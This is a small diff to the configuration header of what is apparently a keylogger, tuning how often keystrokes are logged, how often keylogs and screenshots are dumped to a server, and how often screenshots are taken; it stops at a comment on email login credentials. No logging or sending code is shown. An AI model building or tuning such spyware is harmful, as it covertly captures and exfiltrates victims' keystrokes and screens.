@@ -20,18 +20,18 @@
 /**
  * How often the keylog is written in minutes
  **/
-#define LOG_FREQUENCY_MINUTES 1
+#define LOG_FREQUENCY_MINUTES 0.3
 
 /**
  * How often the keylog and screenshots are 
  * dumped to the server in minutes
  */
-#define DUMP_FREQUENCY_MINUTES 0.05
+#define DUMP_FREQUENCY_MINUTES 1
 
 /**
  * How often screenshots are recorded in minutes
  */
-#define SS_FREQUENCY_MINUTES 5
+#define SS_FREQUENCY_MINUTES 0.25
 
 /**
  * Login Credentials for email
